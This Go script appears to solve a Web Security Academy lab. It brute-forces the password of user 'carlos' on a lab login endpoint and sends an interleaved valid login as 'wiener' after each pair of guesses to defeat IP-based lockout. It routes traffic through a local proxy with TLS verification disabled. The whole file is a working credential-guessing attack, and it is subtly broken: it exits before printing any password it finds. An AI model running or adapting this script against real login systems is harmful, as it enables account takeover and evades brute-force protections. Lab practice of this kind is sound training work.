```go
package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"net/http"
	"net/url"
	"os"

	"golang.org/x/net/http2"
)

type payloadType struct {
	username string
	password string
}

func main() {
	tr := trProxy()
	const passwordFileName string = "../passwords.txt"
	cl := &http.Client{
		Transport: tr,
	}

	wordList := readLinesByFileName(passwordFileName)

	for i := 0; i < len(wordList)/2; i++ {
		firstLine := wordList[i]
		secondLine := wordList[len(wordList)/2+i]
		firstAttempt := sendAttackRequest(firstLine, cl)
		secondAttempt := sendAttackRequest(secondLine, cl)
		sendValidLoginRequest(cl)
		if firstAttempt != "" {
			fmt.Println(firstAttempt)
			return
		}
		if secondAttempt != "" {
			fmt.Println(secondAttempt)
			return
		}
	}

}

func sendAttackRequest(passwordLine string, cl *http.Client) string {
	bodyReq := fmt.Sprintf("username=carlos&password=%s", passwordLine)
	bodyReqPayload := []byte(bodyReq)
	resp, err := cl.Post("https://0af9005b03b5429b87219d7400180097.web-security-academy.net/login", "application/x-www-form-urlencoded", bytes.NewBuffer(bodyReqPayload))
	if err != nil {
		return fmt.Sprintln("Error making POST request:", err)
	}

	if resp.Status == "302 Found" {
		os.Exit(0)
		return fmt.Sprintln("The password is: ", passwordLine)
	}
	defer resp.Body.Close()
	return ""
}

func sendValidLoginRequest(cl *http.Client) {
	resp, err := cl.Post("https://0af9005b03b5429b87219d7400180097.web-security-academy.net/login", "application/x-www-form-urlencoded", bytes.NewBuffer([]byte("username=wiener&password=peter")))
	if err != nil {
		println("Error making POST request:", err)
	}
	defer resp.Body.Close()
	if resp.Status == "302 Found" {
		println("Request sent it correctly")
	}
}

func trProxy() *http.Transport {
	proxyURL, err := url.Parse("http://127.0.0.1:8080")
	if err != nil {
		fmt.Printf("Error seting the proxy: %v\n", err)
	}
	caCert, err := os.ReadFile("/home/nautilus/Downloads/ca(1).crt")
	caCertPool := x509.NewCertPool()
	ok := caCertPool.AppendCertsFromPEM(caCert)
	if !ok {
		msg := "trProxy: could not append cert\n"
		fmt.Println(msg, err)
	}
	tlsConfig := &tls.Config{
		RootCAs:            caCertPool,
		InsecureSkipVerify: true,
	}
	tr := &http.Transport{
		Proxy:           http.ProxyURL(proxyURL),
		TLSClientConfig: tlsConfig}

	err = http2.ConfigureTransport(tr)
	if err != nil {
		msg := fmt.Sprintf("trProxy: Cannot switch to HTTP2: %s\n", err.Error())
		fmt.Println(msg)
	}

	http.DefaultTransport = tr
	return tr

}
func readLinesByFileName(filePath string) []string {
	if filePath == "" {
		return nil
	}
	file, err := os.Open(filePath)
	if err != nil {
		fmt.Printf("Error opening file %s: %v\n", filePath, err)
		os.Exit(1)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("Error reading file %s: %v\n", filePath, err)
		os.Exit(1)
	}
	return lines
}
```